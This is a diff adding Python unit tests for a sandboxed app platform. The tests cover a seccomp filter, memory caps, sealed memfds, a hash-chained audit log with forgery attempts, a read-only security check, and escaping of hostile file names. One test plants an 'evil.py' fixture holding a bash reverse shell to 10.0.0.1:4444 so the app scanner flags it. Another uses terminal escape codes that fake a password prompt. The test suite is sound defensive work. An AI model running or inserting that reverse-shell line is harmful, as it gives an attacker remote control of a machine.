@@ -243,6 +243,503 @@ class TestSandboxedRun(Env):
         self.assertIn("vhost-vsock-device,guest-cid=5", argv)
 
 
+def _bpf_run(prog, arch: int, nr: int) -> int:
+    """A tiny classic-BPF interpreter: just the opcodes seccomp_program emits."""
+    data, acc, pc = {0: nr, 4: arch}, 0, 0
+    while True:
+        code, jt, jf, k = prog[pc]
+        if code == 0x20:                       # ld [k]
+            acc = data[k]
+        elif code == 0x15:                     # jeq k
+            pc += jt if acc == k else jf
+        elif code == 0x35:                     # jge k
+            pc += jt if acc >= k else jf
+        elif code == 0x06:                     # ret k
+            return k
+        else:
+            raise AssertionError(f"unexpected opcode {code:#x}")
+        pc += 1
+
+
+class TestSeccomp(unittest.TestCase):
+    ALLOW, KILL = 0x7FFF0000, 0x80000000
+    EPERM = 0x00050000 | 1
+
+    def test_program_allows_normal_calls_and_denies_the_list(self):
+        from kos.sandbox import AUDIT_ARCH_X86_64 as ARCH, SECCOMP_DENY_X86_64, X32_SYSCALL_BIT, seccomp_program
+        prog = seccomp_program()
+        for nr in (0, 1, 2, 3, 9, 12, 56, 57, 59, 202, 231, 257, 435):   # read write open close mmap brk
+            self.assertEqual(_bpf_run(prog, ARCH, nr), self.ALLOW, nr)    # clone fork execve futex exit_group openat clone3
+        for name, nr in SECCOMP_DENY_X86_64.items():
+            self.assertEqual(_bpf_run(prog, ARCH, nr), self.EPERM, name)
+        self.assertEqual(_bpf_run(prog, ARCH, X32_SYSCALL_BIT | 321), self.EPERM)   # x32 cannot dodge the list
+        self.assertEqual(_bpf_run(prog, 0x40000003, 0), self.KILL)                  # i386 compat: not ours
+        self.assertLess(len(prog), 64)
+
+    def test_numbers_match_the_kernel_header_when_it_is_installed(self):
+        import re
+        from kos.sandbox import SECCOMP_DENY_X86_64
+        header = Path("/usr/include/x86_64-linux-gnu/asm/unistd_64.h")
+        if not header.exists():
+            self.skipTest("kernel headers not installed")
+        table = dict(re.findall(r"#define __NR_(\w+)\s+(\d+)", header.read_text()))
+        for name, nr in SECCOMP_DENY_X86_64.items():
+            self.assertEqual(int(table[name]), nr, name)
+
+    @unittest.skipUnless(os.uname().machine == "x86_64", "the filter is x86_64 only")
+    def test_real_sandbox_denies_them_and_still_runs_normal_programs(self):
+        import subprocess
+        code = r'''
+import ctypes, errno, os, sys, threading, sqlite3, socket, zlib, json
+libc = ctypes.CDLL(None, use_errno=True)
+bad = []
+for name, nr in __DENY__.items():
+    ctypes.set_errno(0)
+    r = libc.syscall(nr, 0, 0, 0, 0, 0, 0)
+    if not (r == -1 and ctypes.get_errno() == errno.EPERM):
+        bad.append((name, r, ctypes.get_errno()))
+# ordinary work must be untouched: threads, fork, sockets, sqlite, zlib
+t = threading.Thread(target=lambda: None); t.start(); t.join()
+pid = os.fork()
+if pid == 0: os._exit(7)
+assert os.waitpid(pid, 0)[1] >> 8 == 7
+a, b = socket.socketpair(); a.sendall(b"hi"); assert b.recv(2) == b"hi"
+db = sqlite3.connect(":memory:"); db.execute("create table t(x)"); db.execute("insert into t values (1)")
+assert zlib.decompress(zlib.compress(b"x" * 1000)) == b"x" * 1000
+print("denied-wrongly:", bad, "| seccomp mode:", [l.split()[1] for l in open("/proc/self/status") if l.startswith("Seccomp:")][0])
+'''.replace("__DENY__", repr(__import__("kos.sandbox", fromlist=["x"]).SECCOMP_DENY_X86_64))
+        r = subprocess.run([sys.executable, "-I", "-S", "-B", "-c", code], preexec_fn=SandboxPolicy().preexec(),
+                           capture_output=True, text=True, cwd="/")
+        self.assertEqual(r.returncode, 0, r.stderr[-500:])
+        self.assertIn("denied-wrongly: [] | seccomp mode: 2", r.stdout)
+
+    def test_memory_and_file_size_are_capped(self):
+        import subprocess
+        p = SandboxPolicy()
+        self.assertEqual(p.max_memory, 1 << 30)
+        code = r'''
+import os
+try:
+    bytearray(1200 << 20); print("memory: NOT CAPPED")
+except MemoryError:
+    print("memory: capped")
+import resource
+print("fsize:", resource.getrlimit(resource.RLIMIT_FSIZE)[0])
+'''
+        r = subprocess.run([sys.executable, "-I", "-S", "-B", "-c", code], preexec_fn=p.preexec(),
+                           capture_output=True, text=True, cwd="/")
+        self.assertEqual(r.returncode, 0, r.stderr[-500:])
+        self.assertIn("memory: capped", r.stdout)
+        self.assertIn(f"fsize: {64 << 20}", r.stdout)
+
+
+class TestSealedMemfd(unittest.TestCase):
+    """The memfd holding the verified app is what actually runs, so the kernel
+    must refuse to change it (no swap between "checked" and "run"). This used to
+    crash on Pythons whose ``fcntl`` lacks the F_*SEAL* constants."""
+
+    def test_sealed_image_cannot_be_modified(self):
+        import errno
+        import fcntl
+        fd = loader.sealed_memfd("probe", b"verified bytes")
+        try:
+            self.assertEqual(fcntl.fcntl(fd, loader.F_GET_SEALS) & loader.ALL_SEALS, loader.ALL_SEALS)
+            self.assertEqual(os.pread(fd, 64, 0), b"verified bytes")
+            for attempt in (lambda: os.pwrite(fd, b"X", 0),           # overwrite
+                            lambda: os.ftruncate(fd, 1 << 16),        # grow
+                            lambda: os.ftruncate(fd, 1),              # shrink
+                            lambda: fcntl.fcntl(fd, loader.F_ADD_SEALS, loader.F_SEAL_WRITE)):  # re-seal
+                with self.assertRaises(OSError) as cm:
+                    attempt()
+                self.assertEqual(cm.exception.errno, errno.EPERM)
+            self.assertEqual(os.pread(fd, 64, 0), b"verified bytes")  # still intact
+        finally:
+            os.close(fd)
+
+
+class TestAuditChain(Env):
+    """The authorization log is tamper-evident: editing, deleting or reordering
+    lines is noticed, and recomputing the chain needs the password."""
+
+    def setUp(self):
+        super().setUp()
+        from kos.auth import AUDIT_KEY_LABEL, AuditLog, subkey
+        self.log = AuditLog(self.paths)
+        master = PasswordStore(self.paths).verify(PW.encode())
+        self.key = subkey(master, AUDIT_KEY_LABEL)
+
+    def _lines(self):
+        return self.log.file.read_bytes().split(b"\n")[:-1]
+
+    def _write(self, lines):
+        self.log.file.write_bytes(b"\n".join(lines) + b"\n")
+
+    def _fill(self, n=6):
+        for i in range(n):
+            self.log.record("app.run", f"app{i}", "bad-password" if i % 2 else "cancelled")
+
+    def test_grants_are_chained_and_anchored_to_the_password(self):
+        from kos.auth import GENESIS
+        self.authority(PW).authorize("app.run", "hello").close()
+        self.log.record("app.run", "x", "denied")
+        first, last = self.log.entries()
+        self.assertEqual(first["p"], GENESIS)
+        self.assertEqual(last["p"], first["h"])
+        self.assertIn("m", first)                 # a grant: anchored
+        self.assertNotIn("m", last)               # a refusal: nothing to anchor to
+        rep = self.log.verify(self.key)
+        self.assertTrue(rep.ok and rep.anchors_checked and rep.anchored == 1 and rep.chained == 2)
+        self.assertFalse(self.log.verify(b"x" * 32).ok)        # the wrong password's key fails
+
+    def test_editing_deleting_or_reordering_a_line_is_detected(self):
+        self._fill()
+        good = self._lines()
+        self.assertTrue(self.log.verify().ok)
+        edited = list(good); edited[2] = edited[2].replace(b"cancelled", b"denied")
+        self.assertNotEqual(edited[2], good[2])          # the edit must really change something
+        deleted = good[:2] + good[3:]
+        swapped = good[:2] + [good[3], good[2]] + good[4:]
+        for label, lines, bad in (("edit", edited, 3), ("delete", deleted, 3), ("reorder", swapped, 3)):
+            self._write(lines)
+            rep = self.log.verify()
+            self.assertFalse(rep.ok, label)
+            self.assertEqual(rep.bad_line, bad, label)
+
+    def test_recomputing_the_chain_without_the_password_is_caught_by_the_anchors(self):
+        """The cover-up: delete an embarrassing line, then re-link everything after it."""
+        from kos.auth import GENESIS, _link
+        self.log.record("app.install", "evil", "bad-password")        # to be hidden
+        self.authority(PW).authorize("app.run", "hello").close()      # anchored grant
+        self.log.record("app.run", "x", "denied")
+        lines = self._lines()[1:]                                      # drop the first line ...
+        prev, forged = GENESIS, []
+        for raw in lines:                                              # ... and re-link what is left
+            e = json.loads(raw)
+            e["p"] = prev
+            e["h"] = prev = _link(e["p"], e)
+            forged.append(json.dumps(e, separators=(",", ":")).encode())
+        self._write(forged)
+        self.assertTrue(self.log.verify().ok)             # a plain chain cannot tell ...
+        rep = self.log.verify(self.key)                   # ... the password can
+        self.assertFalse(rep.ok)
+        self.assertEqual(rep.bad_line, 1)
+        self.assertIn("password", rep.problem)
+
+    def test_a_grant_cannot_lose_its_anchor(self):
+        self.authority(PW).authorize("app.run", "hello").close()
+        (line,) = self._lines()
+        e = json.loads(line)
+        del e["m"]
+        self._write([json.dumps(e, separators=(",", ":")).encode()])
+        rep = self.log.verify()
+        self.assertFalse(rep.ok)
+        self.assertIn("anchor", rep.problem)
+
+    def test_lines_from_before_the_chain_existed_are_tolerated(self):
+        old = [json.dumps({"t": 1.0, "action": "app.run", "target": "a", "outcome": "granted"}).encode(),
+               json.dumps({"t": 2.0, "action": "app.run", "target": "b", "outcome": "denied"}).encode()]
+        self._write(old)
+        self.log.record("app.run", "c", "denied")
+        rep = self.log.verify(self.key)
+        self.assertTrue(rep.ok)
+        self.assertEqual((rep.legacy, rep.chained), (2, 1))
+        self.assertEqual(len(self.log.entries()), 3)
+
+    def test_concurrent_writers_keep_one_unbroken_chain(self):
+        def writer(k):
+            for i in range(30):
+                self.log.record("app.run", f"w{k}-{i}", "denied")
+        threads = [threading.Thread(target=writer, args=(k,)) for k in range(6)]
+        for t in threads: t.start()
+        for t in threads: t.join()
+        rep = self.log.verify()
+        self.assertEqual(rep.entries, 180)
+        self.assertTrue(rep.ok, rep.problem)
+
+    def test_trim_keeps_the_chain_valid_and_never_loses_a_concurrent_record(self):
+        errors, recorded = [], []
+        def writer(k):
+            try:
+                for i in range(40):
+                    self.log.record("app.run", f"w{k}-{i}", "denied")
+                    recorded.append(1)
+            except Exception as e:                       # pragma: no cover
+                errors.append(e)
+        threads = [threading.Thread(target=writer, args=(k,)) for k in range(3)]
+        for t in threads: t.start()
+        dropped = 0
+        while any(t.is_alive() for t in threads):
+            dropped += self.log.trim(25)
+        for t in threads: t.join()
+        dropped += self.log.trim(25)
+        self.assertEqual(errors, [])
+        rep = self.log.verify()
+        self.assertTrue(rep.ok, rep.problem)
+        self.assertEqual(rep.entries, 25)
+        self.assertTrue(rep.trimmed)
+        # every record is either still there or was counted as trimmed: none vanished
+        self.assertEqual(rep.entries + dropped, len(recorded))
+        self.log.record("app.run", "after", "denied")      # and the log still accepts records
+        self.assertTrue(self.log.verify().ok)
+
+    def test_tail_matches_a_full_read_including_across_chunks(self):
+        import kos.auth as kauth
+        self._fill(60)
+        with mock.patch.object(kauth, "_TAIL_CHUNK", 100):
+            for n in (1, 5, 59, 60, 500):
+                self.assertEqual(self.log.tail(n), self.log.entries()[-n:], n)
+        self.assertEqual(self.log.tail(0), [])
+        import kos.auth
+        self.assertEqual(kos.auth.AuditLog(Paths(Path(self.tmp.name) / "none")).tail(5), [])
+
+    def test_a_damaged_log_never_blocks_recording_but_is_reported(self):
+        self._fill(3)
+        with open(self.log.file, "ab") as f:
+            f.write(b'{"t": 1, "action": "app.r')      # a torn last line
+        self.log.record("app.run", "after", "denied")  # must not raise
+        rep = self.log.verify()
+        self.assertFalse(rep.ok)
+        self.assertEqual(rep.bad_line, 4)
+
+    def test_kos_audit_verify_checks_the_anchors_with_the_password(self):
+        import contextlib
+        import types
+        self.authority(PW).authorize("app.run", "hello").close()
+        self.log.record("app.run", "x", "denied")
+        def run():
+            out = io.StringIO()
+            with mock.patch.object(kcli, "_authority", lambda paths: (self.authority(PW), None)), \
+                    contextlib.redirect_stdout(out):
+                code = kcli.cmd_audit(types.SimpleNamespace(n=5, verify=True), self.paths)
+            return code, out.getvalue()
+        code, text = run()
+        self.assertEqual(code, 0, text)
+        self.assertIn("intact", text)
+        lines = self._lines()
+        lines[0] = lines[0].replace(b'"app.run"', b'"app.xxx"', 1)
+        self._write(lines)
+        code, text = run()
+        self.assertEqual(code, 3)
+        self.assertIn("TAMPERED at line 1", text)
+
+
+class TestSecurityCheck(Env):
+    """`kos security`: read-only, no password, and it must actually fail when things are wrong."""
+
+    def setUp(self):
+        super().setUp()
+        from kos.permit import PermitStore
+        self.paths.ensure()
+        AppStore(self.paths).install(self.kapp, self.authority(PW))
+        PermitStore(self.paths).grant("hello", declared=[])
+        self.state = self.paths.state
+
+    def run_checks(self):
+        from kos.secure import run_checks
+        return run_checks(self.paths)
+
+    def levels(self, name):
+        return [c.level for c in self.run_checks() if c.name == name]
+
+    def detail(self, name):
+        return " | ".join(c.detail for c in self.run_checks() if c.name == name)
+
+    def test_a_healthy_install_has_no_failures(self):
+        checks = self.run_checks()
+        self.assertEqual([c for c in checks if c.level == "fail"], [])
+        self.assertEqual({c.name for c in checks},
+                         {"kernel", "password", "files", "audit log", "apps", "permissions", "owed", "leftovers"})
+        self.assertEqual(self.levels("password"), ["warn"])          # the test KDF (N=1024) is deliberately weak
+        self.assertIn("weak", self.detail("password"))
+        self.assertEqual(self.levels("apps"), ["pass"])
+
+    def test_an_app_modified_after_install_is_a_failure(self):
+        (self.paths.apps / "hello.kapp").write_bytes((self.paths.apps / "hello.kapp").read_bytes() + b"\0")
+        self.assertEqual(self.levels("apps"), ["fail"])
+        self.assertIn("modified since install: hello", self.detail("apps"))
+
+    def test_an_app_the_scanner_now_flags_is_a_failure_even_if_its_recorded_hash_was_updated(self):
+        import hashlib
+        kapp = self.paths.apps / "hello.kapp"
+        buf = io.BytesIO()
+        with zipfile.ZipFile(kapp) as src, zipfile.ZipFile(buf, "w") as dst:
+            for i in src.infolist():
+                dst.writestr(i.filename, src.read(i.filename))
+            dst.writestr("evil.py", "import os\nos.system('bash -i >& /dev/tcp/10.0.0.1/4444 0>&1')\n")
+        kapp.write_bytes(buf.getvalue())
+        seal = self.paths.apps / "hello.seal"
+        meta = json.loads(seal.read_text())
+        meta["sha256"] = hashlib.sha256(buf.getvalue()).hexdigest()      # what a careless forger does
+        seal.write_text(json.dumps(meta))
+        self.assertEqual(self.levels("apps"), ["fail"])
+        self.assertIn("reverse-shell", self.detail("apps"))
+
+    def test_missing_pieces_of_an_install_are_a_failure(self):
+        (self.paths.apps / "hello.kapp").unlink()
+        self.assertEqual(self.levels("apps"), ["fail"])
+        self.assertIn("missing", self.detail("apps"))
+
+    def test_secrets_others_can_read_are_a_failure(self):
+        os.chmod(self.paths.auth_file, 0o644)
+        self.assertEqual(self.levels("files"), ["fail"])
+        self.assertIn("auth.json", self.detail("files"))
+
+    def test_a_tampered_audit_log_is_a_failure(self):
+        for i in range(4):
+            AuditLogFor_(self.paths).record("app.run", f"a{i}", "denied")
+        log = self.paths.logs / "audit.log"
+        lines = log.read_bytes().split(b"\n")
+        del lines[2]
+        log.write_bytes(b"\n".join(lines))
+        self.assertEqual(self.levels("audit log"), ["fail"])
+        self.assertIn("TAMPERED", self.detail("audit log"))
+
+    def test_grants_nothing_uses_and_grants_that_were_never_pinned_are_warnings(self):
+        grants = self.state / "permissions" / "grants.json"
+        data = json.loads(grants.read_text())
+        data.append({"app": "ghost-app", "resource": "run", "level": "use", "at": 1.0, "declared": []})
+        for e in data:
+            if e["app"] == "hello":
+                e.pop("declared", None)
+        grants.write_text(json.dumps(data))
+        self.assertEqual(self.levels("permissions"), ["warn", "warn"])
+        text = self.detail("permissions")
+        self.assertIn("ghost-app", text)
+        self.assertIn("hello", text)
+
+    def test_owed_work_and_interrupted_writes_are_warnings(self):
+        import time
+        (self.state / "owed.json").write_text(json.dumps(
+            [{"id": "x", "trigger": "file.write", "target": "/t", "owes": ["scan", "optimize"], "at": 1.0}]))
+        os.chmod(self.state / "owed.json", 0o600)
+        tmp = self.state / ".auth-throttle.json.tmp.1"
+        tmp.write_text("x")
+        os.utime(tmp, (time.time() - 7200,) * 2)
+        self.assertEqual(self.levels("owed"), ["warn"])
+        self.assertEqual(self.levels("leftovers"), ["warn"])
+        fresh = self.state / ".auth-throttle.json.tmp.2"
+        fresh.write_text("x")                       # a write in progress right now is not a leftover
+        self.assertIn("1 temporary", self.detail("leftovers"))
+
+    def test_a_check_that_crashes_is_reported_not_swallowed(self):
+        import kos.secure as secure
+        def boom(paths):
+            raise RuntimeError("disk on fire")
+        with mock.patch.object(secure, "CHECKS", (boom,)):
+            (c,) = secure.run_checks(self.paths)
+        self.assertEqual(c.level, "fail")
+        self.assertIn("disk on fire", c.detail)
+
+    def test_command_exit_code_and_output_is_safe_to_print(self):
+        import contextlib
+        import types
+        def run():
+            out = io.StringIO()
+            with contextlib.redirect_stdout(out):
+                code = kcli.cmd_security(types.SimpleNamespace(), self.paths)
+            return code, out.getvalue()
+        code, text = run()
+        self.assertEqual(code, 0, text)
+        self.assertIn("Result:", text)
+        grants = self.state / "permissions" / "grants.json"
+        data = json.loads(grants.read_text())
+        data.append({"app": "\x1b[2Jfake", "resource": "run", "level": "use", "at": 1.0, "declared": []})
+        grants.write_text(json.dumps(data))
+        os.chmod(self.paths.auth_file, 0o666)
+        code, text = run()
+        self.assertEqual(code, 3)
+        self.assertNotIn("\x1b", text)
+
+    def test_it_needs_no_password_and_changes_nothing(self):
+        before = {p: p.read_bytes() for p in self.paths.root.rglob("*") if p.is_file()}
+        self.run_checks()
+        after = {p: p.read_bytes() for p in self.paths.root.rglob("*") if p.is_file()}
+        self.assertEqual(before, after)
+
+    def test_it_is_reachable_in_every_language_of_the_line_shell(self):
+        interpret = __import__("kos.lang", fromlist=["interpret"]).interpret
+        for line in ("security", "seguridad", "sécurité", "sicherheit", "sicurezza", "безопасность", "安全", "セキュリティ"):
+            r = interpret(line)
+            self.assertEqual((r.kind, list(r.argv)), ("command", ["security"]), line)
+
+
+def AuditLogFor_(paths):
+    from kos.auth import AuditLog
+    return AuditLog(paths)
+
+
+class TestHostileInput(Env):
+    """Names and leftovers from disks, zips and crashes are not trusted."""
+
+    ESC_NAME = "\x1b[2J\x1b[1;1HPassword to unlock: "
+
+    def _evil_zip(self, directory: Path) -> Path:
+        buf = io.BytesIO()
+        with zipfile.ZipFile(buf, "w") as z:
+            z.writestr(self.ESC_NAME, b"payload")
+        p = directory / "evil.zip"
+        p.write_bytes(buf.getvalue())
+        return p
+
+    def test_stale_temp_file_cannot_block_atomic_write(self):
+        from kos.paths import atomic_write
+        target = Path(self.tmp.name) / "auth-throttle.json"
+        # what a crash used to leave behind: the old predictable per-pid name
+        (Path(self.tmp.name) / f".{target.name}.tmp.{os.getpid()}").write_bytes(b"stale")
+        atomic_write(target, b'{"failures": 1}')
+        self.assertEqual(target.read_bytes(), b'{"failures": 1}')
+        atomic_write(target, b'{"failures": 2}')      # and again
+        self.assertEqual(target.read_bytes(), b'{"failures": 2}')
+        self.assertEqual(oct(target.stat().st_mode & 0o777), "0o600")
+
+    def test_dangling_symlink_does_not_break_listing(self):
+        d = Path(self.tmp.name) / "browse"
+        d.mkdir()
+        (d / "ok.txt").write_text("hi")
+        os.symlink("/nonexistent/target", d / "dangling")
+        names = {e.name: e for e in VFS(d).list()}
+        self.assertEqual(set(names), {"ok.txt", "dangling"})
+        self.assertFalse(names["dangling"].is_archive)
+
+    def test_hostile_names_are_shown_escaped_but_still_reachable(self):
+        from kos.protocol import escape_text
+        d = Path(self.tmp.name) / "browse"
+        d.mkdir()
+        self._evil_zip(d)
+        v = VFS(d)
+        v.cd("evil.zip")
+        (entry,) = v.list()
+        self.assertEqual(entry.name, self.ESC_NAME)                   # the data is untouched ...
+        shown = escape_text(entry.name)
+        self.assertNotIn("\x1b", shown)                                # ... what is printed is not
+        self.assertIn("\\x1b[2J", shown)
+        self.assertNotIn("\x1b", v.pwd())
+        self.assertEqual(v.read_bytes(shown), b"payload")              # typed the way it is shown
+        self.assertEqual(v.read_bytes(self.ESC_NAME), b"payload")      # or the way it really is
+        with self.assertRaises(VFSError) as cm:
+            v.read_bytes("\x1b[31mnope")
+        self.assertNotIn("\x1b", str(cm.exception))
+
+    def test_ls_audit_and_activity_never_print_escape_codes(self):
+        import contextlib
+        import types
+        from kos.activity import build_feed, render_feed
+        from kos.auth import AuditLog
+        d = Path(self.tmp.name) / "browse"
+        d.mkdir()
+        self._evil_zip(d)
+        AuditLog(self.paths).record("file.view", f"{d}/evil.zip/{self.ESC_NAME}", "granted")
+        for label, call in (
+                ("kos ls", lambda: kcli.cmd_ls(types.SimpleNamespace(path=str(d / "evil.zip")), self.paths)),
+                ("kos audit", lambda: kcli.cmd_audit(types.SimpleNamespace(n=10, verify=False), self.paths)),
+                ("kos activity", lambda: print(render_feed(build_feed(self.paths))))):
+            out = io.StringIO()
+            with contextlib.redirect_stdout(out):
+                call()
+            self.assertNotIn("\x1b", out.getvalue(), label)
+            self.assertIn("\\x1b[2J", out.getvalue(), label)
+
+
 class TestVFS(Env):
     def test_cd_into_zip_without_extracting(self):
         vfs = VFS(self.tmp.name)
@@ -292,11 +789,29 @@ def _alive_pid(pid: int) -> bool:
         return False
 
 
+def _stop_leftover_brokers(paths) -> None:
+    """A test that fails half-way must not leave a broker and its app running."""
+    import signal
+    import time
+    for inst in Registry(paths).list():
+        try:
+            os.kill(inst.broker_pid, signal.SIGTERM)
+        except (ProcessLookupError, PermissionError):
+            pass
+    deadline = time.monotonic() + 5
+    while Registry(paths).list() and time.monotonic() < deadline:
+        time.sleep(0.05)
+
+
 class TestOpenAttachClose(Env):
     """The `open`/`ps`/`attach`/`close` lifecycle, exercised in cmd mode so
     no real terminal is needed: `open` launches the app in the background
     under a broker, `attach` drives it, Ctrl-C detaches (app keeps running),
     `close` actually stops it."""
+
+    def tearDown(self):
+        _stop_leftover_brokers(self.paths)
+        super().tearDown()
 
     def _open(self, mode="cmd"):
         store = AppStore(self.paths)
@@ -312,7 +827,7 @@ class TestOpenAttachClose(Env):
         spawn(inst, app, mode, SandboxPolicy(), registry, Path(inst.log_path))
         return registry, inst_id
 
-    def _wait_running(self, registry, inst_id, timeout=5):
+    def _wait_running(self, registry, inst_id, timeout=15):
         import time
         deadline = time.monotonic() + timeout
         while time.monotonic() < deadline:
@@ -367,6 +882,51 @@ class TestOpenAttachClose(Env):
         self.assertFalse(Registry(self.paths)._file(inst_id).exists())
         self.assertFalse(os.path.exists(inst.sock_path))
 
+    @staticmethod
+    def _wakeups(pid: int) -> int:
+        """How many times the kernel has put this process to sleep waiting (Linux)."""
+        import re
+        status = Path(f"/proc/{pid}/status").read_text()
+        return int(re.search(r"^voluntary_ctxt_switches:\s+(\d+)", status, re.M).group(1))
+
+    @unittest.skipUnless(hasattr(os, "pidfd_open"), "needs pidfd_open")
+    def test_idle_broker_does_not_poll_and_stops_promptly(self):
+        """A background app that nobody is using must cost nothing: the broker
+        sleeps until something happens (it used to wake once a second, and
+        needed up to a second to notice SIGTERM)."""
+        import signal
+        import time
+        registry, inst_id = self._open("cmd")
+        inst = self._wait_running(registry, inst_id)
+        time.sleep(0.5)                                   # let start-up settle
+        before = self._wakeups(inst.broker_pid)
+        time.sleep(3.0)
+        woke = self._wakeups(inst.broker_pid) - before
+        self.assertLessEqual(woke, 1, f"idle broker woke {woke} times in 3 s (was ~3 with polling)")
+        t0 = time.monotonic()
+        os.kill(inst.broker_pid, signal.SIGTERM)
+        while Registry(self.paths)._file(inst_id).exists() and time.monotonic() - t0 < 5:
+            time.sleep(0.01)
+        took = time.monotonic() - t0
+        self.assertFalse(Registry(self.paths)._file(inst_id).exists())
+        # A lost wakeup would leave the broker blocked in select() for good (the loop above gives up
+        # after 5 s). The bound is loose on purpose so a busy machine cannot fail it.
+        self.assertLess(took, 2.0, f"SIGTERM took {took:.2f}s to shut the broker down")
+
+    def test_broker_notices_when_its_app_exits_by_itself(self):
+        import time
+        registry, inst_id = self._open("cmd")
+        inst = self._wait_running(registry, inst_id)
+        c = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
+        c.connect(inst.sock_path)
+        c.sendall(b'{"cmd":"quit"}\n')                    # the app leaves on its own
+        t0 = time.monotonic()
+        while Registry(self.paths)._file(inst_id).exists() and time.monotonic() - t0 < 5:
+            time.sleep(0.01)
+        c.close()
+        self.assertFalse(Registry(self.paths)._file(inst_id).exists())
+        self.assertFalse(os.path.exists(inst.sock_path))
+
     def test_two_opens_are_independent(self):
         registry, id1 = self._open("cmd")
         registry, id2 = self._open("cmd")
@@ -386,6 +946,10 @@ class TestOpenAttachClose(Env):
 
 
 class TestActivity(Env):
+    def tearDown(self):
+        _stop_leftover_brokers(self.paths)
+        super().tearDown()
+
     def test_feed_merges_open_apps_and_audit(self):
         from kos.activity import build_feed, render_feed
         store = AppStore(self.paths)
@@ -400,7 +964,7 @@ class TestActivity(Env):
         import signal
         os.kill(registry.get(inst_id).broker_pid, signal.SIGTERM)
 
-    def _wait_running_local(self, registry, inst_id, timeout=5):
+    def _wait_running_local(self, registry, inst_id, timeout=15):
         import time
         deadline = time.monotonic() + timeout
         while time.monotonic() < deadline:
